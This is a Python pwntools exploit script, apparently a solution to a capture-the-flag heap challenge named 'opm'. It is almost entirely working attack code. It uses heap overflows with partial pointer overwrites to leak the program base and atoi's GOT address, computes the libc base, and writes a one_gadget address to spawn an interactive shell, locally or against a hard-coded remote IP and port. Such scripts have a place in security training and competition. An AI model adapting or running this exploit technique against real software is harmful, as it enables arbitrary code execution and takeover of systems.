#coding=utf8
from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
local = 1

if local:
	cn = process('./opm')
	bin = ELF('./opm')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('39.107.33.43', 13572)
	bin = ELF('./opm')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def add(s, punch):
	cn.recvuntil('(E)xit')
	cn.sendline('A')
	cn.recvuntil('Your name:')
	cn.sendline(s)
	cn.recvuntil('N punch?')
	cn.sendline(punch)

# 0x11c10 chunk at the start
#padding
add('a'*0x30,'0')#0  #*c10 : 31  *c40 : 41
add('a'*0x30,'1')#1  #*c80 : 31  *cb0 : 41
#leak
add('a'*0x80 +'\x40','1') #2 #*cf0 : 31 *d20 : 91 ; *c00 -> 0040
add('a'*0x80 +'\x2d', '1') #3 #*db0 : 31 *de0 : 91 ; *dc0 -> 002d-0034, 0035-003c, 003d-0044, 0045-0048: to fake 0047: ******00 -> chunk2 header, leak show_chunk addr
#just overwrite chunk, not over write name
add('a','a'*0x80 +'\x40') #4 #*e70 : 31 *ea0 : 21 ; *d80 -> 0040

cn.recvuntil('<')
#0000000000000B30 show_chunk_B30  proc near  
code_base = u64(cn.recvuntil('>')[:-1].ljust(8,'\x00'))-0xb30
success('code_base: '+hex(code_base))
bin.address=code_base
success('atoi_got: '+hex(bin.got['atoi']))
add('a'*0x80+'\x30',str(bin.got['atoi'])) #5 #*ec0 : 31 *ef0 : 91 ; *ed0 -> 0030, 0048: got
add('a','a'*0x80+'\x40') #6 #*f80 : 31 *fb0 : 21 ; *f90 -> 0040
gdb.attach(cn)
cn.recvuntil('<')
atoi_addr = u64(cn.recvuntil('>')[:-1].ljust(8,'\x00'))
success('atoi_addr: '+hex(atoi_addr))
libc_base = atoi_addr-libc.sym['atoi']
success('libc_base: '+hex(libc_base))
ongadget = libc_base+0x4526a
add('a'*0x80+'\x34',str(ongadget >> 32)) #0034 + 18 = 004c: high 32 bit of onegadget
add('a'*0x80+'\x30',str(ongadget)) #0030+18 = 0048: low 32 bit of onegadget
add('a'*0x80+'\x48','1') #chunk = 0048
cn.sendline('S')
cn.interactive()